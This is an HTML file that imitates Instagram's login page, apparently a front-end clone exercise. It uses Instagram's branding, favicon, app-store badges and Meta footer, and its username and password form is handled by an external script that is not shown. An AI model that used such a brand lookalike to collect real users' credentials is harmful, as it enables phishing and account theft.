<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram - NKC</title>
    <link
      data-default-icon="https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/i8Mc7za91gZ.png"
      rel="icon"
      sizes="192x192"
      href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/r/i8Mc7za91gZ.png"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
      integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,200;0,300;0,400;0,500;0,700;0,900;1,500&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./app/css/style.css" />
  </head>
  <body>
    <div class="container">
      <div id="form">
        <div class="form-content">
          <div class="logo">
            <img src="./image/Instagram_logo.svg.png" alt="" />
          </div>

          <form id="form">
            <p class="error-msg">Error</p>
            <input
              class="username-input"
              type="text"
              placeholder="Username or email"
              required
            />
            <input
              class="password-input"
              type="password"
              placeholder="Password"
              required
            />

            <button type="submit" class="btn-submit">Log in</button>
          </form>
        </div>
        <div class="form-account">
          Don't have an account?
          <a href="./signup.html"><span>Sign up</span></a>
        </div>
        <div class="form-getapp">
          <p>Get the app.</p>
          <div class="download">
            <a
              aria-label="Download on the App Store"
              href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo"
              tabindex="0"
              ><img
                alt="Download on the App Store"
                src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" /></a
            ><a
              aria-label="Get it on Google Play"
              href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD84BA697-9A0F-47CD-9784-15FF7E84DBBB%26utm_content%3Dlo%26utm_medium%3Dbadge"
              tabindex="0"
              ><img
                alt="Get it on Google Play"
                src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
            /></a>
          </div>
        </div>
      </div>
      <!-- Footer -->
      <div class="footer">
        <div class="about">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Top Accounts</a>
          <a href="#">Hashtags</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
        </div>

        <div class="end">
          <span>English <i class="fa-solid fa-angle-down"></i></span>
          <p>Â© 2022 Instagram from Meta</p>
        </div>
      </div>
    </div>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.0.0-alpha.1/axios.min.js"
      integrity="sha512-xIPqqrfvUAc/Cspuj7Bq0UtHNo/5qkdyngx6Vwt+tmbvTLDszzXM0G6c91LXmGrRx8KEPulT+AfOOez+TeVylg=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script type="module" src="./app/js/login.js"></script>
  </body>
</html>
